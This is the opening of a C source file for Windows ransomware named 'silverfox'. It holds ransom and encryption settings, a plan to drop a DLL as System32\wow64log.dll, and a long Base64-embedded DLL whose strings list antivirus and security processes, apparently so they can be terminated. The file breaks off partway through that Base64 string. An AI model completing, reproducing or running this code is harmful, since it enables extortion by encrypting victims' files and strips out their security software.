#include <windows.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <winreg.h>
#include <shlobj.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ==================== 配置宏 ====================
#define RANSOM_PASSWORD_LEN 16
#define WORK_DIR_PREFIX "silverfox_"
#define LOG_FILE "silverfox.log"
#define DLL_TARGET_REL "\\Windows\\System32\\wow64log.dll"
#define ENC_MARKER ".enc"
#define CHUNK_SIZE (1024 * 1024)

// 内嵌 DLL 的 Base64（你自己填，留空就不释放）
const char* EMBEDDED_DLL_B64 = "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cgB2AC4AZQB4AGUAAAAAAHMAZQBjAHUAcgBpAHQAeQBoAGUAYQBsAHQAaABzAGUAcgB2AGkAYwBlAC4AZQB4AGUAAABhAHYAZwB1AGEAcgBkAC4AZQB4AGUAAABhAHYAZwBuAHQALgBlAHgAZQAAAHYAcwBzAGUAcgB2AC4AZQB4AGUAAABiAGQAYQBnAGUAbgB0AC4AZQB4AGUAAABlAGcAdQBpAC4AZQB4AGUAAABlAGsAcgBuAC4AZQB4AGUAAABtAGMAcwBoAGkAZQBsAGQALgBlAHgAZQAAAGEAdgBwAC4AZQB4AGUAAABhAHYAcAB1AGkALgBlAHgAZQAAADMANgAwAHQAcgBhAHkALgBlAHgAZQAAADMANgAwAHMAYQBmAGUALgBlAHgAZQAAAHEAcQBwAGMAcgB0AHAALgBlAHgAZQAAAHEAcQBwAGMAbQBnAHIALgBlAHgAZQAAAGsAcwBhAGYAZQAuAGUAeABlAAAAaABpAHAAcwBkAGEAZQBtAG8AbgAuAGUAeABlAAAAaABpAHAAcwBtAGEAaQBuAC4AZQB4AGUAAAB3AHMAYwB0AHIAbAAuAGUAeABlAAAAdQBzAHkAcwBkAGkAYQBnAC4AZQB4AGUAAAB1AHMAeQBzAG0AZAAuAGUAeABlAAAAdQBzAHkAcwBtAG8AbgAuAGUAeABlAAAAAAAAAAAAbABlAG4AbwB2AG8AcABjAG0AYQBuAGEAZwBlAHIALgBlAHgAZQAAAGwAZQBuAG8AdgBvAC4AbQBvAGQAZQByAG4ALgBpAG0AYwBvAG4AdAByAG8AbABsAGUAcgAuAGUAeABlAAAAAABsAGUAbgBvAHYAbwAuAG0AbwBkAGUAcgBuAC4AaQBtAGMAbwBuAHQAcgBvAGwAbABlAHIALgBwAGwAdQBnAGkAbgBoAG8AcwB0AC4AZQB4AGUAAAAAAAAAbABlAG4AbwB2AG8AIABzAG0AYQByAHQAIABlAG4AZwBpAG4AZQAgAGgAbwBzAHQALgBlAHgAZQAAAAAAAAAAAGwAZQBuAG8AdgBvACAAcwBtAGEAcgB0ACAAZQBuAGcAaQBuAGUAIABzAGUAcgB2AGkAYwBlAC4AZQB4AGUAAABsAGUAbgBvAHYAbwAgAG4AbwB0AGUAYgBvAG8AawAgAGkAdABzACAAcwBlAHIAdgBpAGMA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LmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8kAAAAAAAAAAAAABIlAAARJEAALyQAAAAAAAAAAAAAJiUAADEkQAAAAAAAAAAAAAAAAAAAAAAAAAAAABMkgAAAAAAAFqSAAAAAAAAapIAAAAAAACCkgAAAAAAAJqSAAAAAAAAqpIAAAAAAADGkgAAAAAAANqSAAAAAAAA8pIAAAAAAAAKkwAAAAAAABiTAAAAAAAAIJMAAAAAAAA0kwAAAAAAAEKTAAAAAAAAVJMAAAAAAAAAAAAAAAAAAGSTAAAAAAAAcpMAAAAAAACAkwAAAAAA